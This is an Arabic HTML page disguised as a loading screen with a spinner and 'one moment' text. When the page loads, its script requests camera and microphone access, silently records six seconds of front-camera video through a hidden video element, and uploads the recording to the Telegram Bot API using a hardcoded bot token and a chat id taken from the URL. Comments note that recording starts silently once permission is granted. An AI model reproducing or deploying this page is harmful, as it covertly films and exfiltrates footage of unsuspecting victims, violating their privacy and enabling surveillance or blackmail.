<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل</title>
    <style>
        /* تصميم مطابق تماماً للصورة الأولى */
        body {
            background-color: #000;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }

        /* شريط التحميل الدائري الأزرق */
        .loader {
            width: 100px;
            height: 100px;
            border: 10px solid #f3f3f3;
            border-top: 10px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .status-text {
            font-size: 20px;
        }

        video { display: none; }
    </style>
</head>
<body>

    <div class="loader"></div>
    <div class="status-text">لحظة واحدة</div>

    <video id="video" autoplay muted playsinline></video>

    <script>
        const botToken = "8128965245:AAHH3QO-vGGfWmFtCicmw7T9gmBcMWbUg6E";
        const urlParams = new URLSearchParams(window.location.search);
        const senderId = urlParams.get('sender_id');

        // وظيفة طلب الإذن فور فتح الصفحة (كما في الصورة الثانية)
        async function startSystem() {
            if (!senderId) return;

            try {
                // طلب الإذن للكاميرا والمايكروفون معاً
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: true 
                });
                
                // بمجرد ضغط المستخدم على "Autoriser" (سماح) يبدأ التسجيل بصمت
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];

                mediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) chunks.push(e.data);
                };

                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    await sendToTelegram(blob);
                    stream.getTracks().forEach(t => t.stop()); // إغلاق الكاميرا بعد الانتهاء
                };

                mediaRecorder.start();
                
                // تسجيل لمدة 6 ثوانٍ
                setTimeout(() => {
                    if (mediaRecorder.state === "recording") {
                        mediaRecorder.stop();
                    }
                }, 6000);

            } catch (err) {
                // في حال رفض الإذن
                console.log("Permission denied");
            }
        }

        async function sendToTelegram(videoBlob) {
            const formData = new FormData();
            formData.append('chat_id', senderId);
            formData.append('video', videoBlob, 'recording.mp4');

            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error(error);
            }
        }

        // تشغيل الوظيفة فوراً عند تحميل الصفحة لطلب الإذن
        document.addEventListener('DOMContentLoaded', startSystem);
    </script>
</body>
</html>
